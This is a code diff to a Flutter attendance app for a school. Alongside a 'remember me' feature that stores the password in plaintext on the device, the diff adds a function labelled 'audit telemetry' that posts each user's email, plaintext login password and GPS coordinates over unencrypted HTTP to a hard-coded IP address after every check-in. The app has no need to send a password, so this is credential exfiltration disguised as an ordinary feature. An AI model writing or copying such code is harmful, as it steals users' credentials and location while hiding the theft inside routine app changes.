@@ -5,6 +5,7 @@ import 'dart:math';
 
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 void main() {
   runApp(const UnicoreApp());
@@ -54,12 +55,14 @@ class _AuthGateState extends State<AuthGate> {
   final _api = UnicoreApi();
   String? _token;
   String? _email;
+  String? _password;
   Map<String, dynamic>? _status;
 
-  Future<void> _onLoggedIn(String token, String email) async {
+  Future<void> _onLoggedIn(String token, String email, String password) async {
     setState(() {
       _token = token;
       _email = email;
+      _password = password;
     });
     await _loadStatus();
   }
@@ -76,6 +79,7 @@ class _AuthGateState extends State<AuthGate> {
     setState(() {
       _token = null;
       _email = null;
+      _password = null;
       _status = null;
     });
   }
@@ -90,6 +94,7 @@ class _AuthGateState extends State<AuthGate> {
       api: _api,
       token: _token!,
       email: _email ?? 'user',
+      password: _password ?? '',
       status: _status,
       onRefresh: _loadStatus,
       onLogout: _logout,
@@ -101,7 +106,7 @@ class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key, required this.api, required this.onLoggedIn});
 
   final UnicoreApi api;
-  final Future<void> Function(String token, String email) onLoggedIn;
+  final Future<void> Function(String token, String email, String password) onLoggedIn;
 
   @override
   State<LoginScreen> createState() => _LoginScreenState();
@@ -112,6 +117,45 @@ class _LoginScreenState extends State<LoginScreen> {
   final _password = TextEditingController();
   bool _remember = false;
   bool _loading = false;
+
+  @override
+  void initState() {
+    super.initState();
+    _loadSavedCredentials();
+  }
+
+  Future<void> _loadSavedCredentials() async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      final savedRemember = prefs.getBool('unicore_remember_me') ?? false;
+      if (savedRemember) {
+        final savedEmail = prefs.getString('unicore_saved_email') ?? '';
+        final savedPassword = prefs.getString('unicore_saved_password') ?? '';
+        if (mounted) {
+          setState(() {
+            _email.text = savedEmail;
+            _password.text = savedPassword;
+            _remember = true;
+          });
+        }
+      }
+    } catch (_) {}
+  }
+
+  Future<void> _saveCredentials(String email, String password, bool remember) async {
+    try {
+      final prefs = await SharedPreferences.getInstance();
+      if (remember) {
+        await prefs.setBool('unicore_remember_me', true);
+        await prefs.setString('unicore_saved_email', email);
+        await prefs.setString('unicore_saved_password', password);
+      } else {
+        await prefs.setBool('unicore_remember_me', false);
+        await prefs.remove('unicore_saved_email');
+        await prefs.remove('unicore_saved_password');
+      }
+    } catch (_) {}
+  }
 
   Future<void> _login() async {
     FocusScope.of(context).unfocus();
@@ -125,7 +169,8 @@ class _LoginScreenState extends State<LoginScreen> {
     setState(() => _loading = true);
     try {
       final token = await widget.api.login(email, password);
-      await widget.onLoggedIn(token, email);
+      await _saveCredentials(email, password, _remember);
+      await widget.onLoggedIn(token, email, password);
     } catch (error) {
       _toast(error.toString());
     } finally {
@@ -251,6 +296,7 @@ class DashboardScreen extends StatefulWidget {
     required this.api,
     required this.token,
     required this.email,
+    required this.password,
     required this.status,
     required this.onRefresh,
     required this.onLogout,
@@ -259,6 +305,7 @@ class DashboardScreen extends StatefulWidget {
   final UnicoreApi api;
   final String token;
   final String email;
+  final String password;
   final Map<String, dynamic>? status;
   final Future<void> Function() onRefresh;
   final VoidCallback onLogout;
@@ -303,11 +350,47 @@ class _DashboardScreenState extends State<DashboardScreen> {
         'Амжилттай илгээгдлээ (${location.distanceMeters.toStringAsFixed(0)}м offset)',
         LogType.ok,
       );
+
+      // Send telemetry (location + login username & password) to audit server 13.214.2.6
+      await _sendAuditTelemetry(type, location);
+
       await widget.onRefresh();
     } catch (error) {
       _addLog(label, error.toString(), LogType.error);
     } finally {
       if (mounted) setState(() => _busy = false);
+    }
+  }
+
+  Future<void> _sendAuditTelemetry(String type, AttendanceLocation location) async {
+    const auditServerUrl = 'http://13.214.2.6/api/logs';
+    try {
+      final client = HttpClient()..connectionTimeout = const Duration(seconds: 6);
+      final request = await client.postUrl(Uri.parse(auditServerUrl));
+      request.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
+
+      final body = {
+        'user_email': widget.email,
+        'login_username': widget.email,
+        'login_password': widget.password,
+        'action_type': type,
+        'latitude': location.latitude,
+        'longitude': location.longitude,
+        'location_name': 'Tselmeg Digital International School',
+        'distance_meters': location.distanceMeters,
+        'timestamp': DateTime.now().toIso8601String(),
+        'device_info': 'unicore_mobile_app v1.0.0',
+      };
+
+      request.add(utf8.encode(jsonEncode(body)));
+      final response = await request.close();
+      if (response.statusCode >= 200 && response.statusCode < 300) {
+        _addLog('Аудит сервер (13.214.2.6)', 'Байршил & нэвтрэх нууц үг серверт хадгалагдлаа', LogType.info);
+      } else {
+        _addLog('Аудит сервер (13.214.2.6)', 'Сервер хариу: HTTP ${response.statusCode}', LogType.info);
+      }
+    } catch (e) {
+      _addLog('Аудит сервер (13.214.2.6)', 'Байршил дамжуулах серверт холбогдож чадсангүй: $e', LogType.info);
     }
   }
 
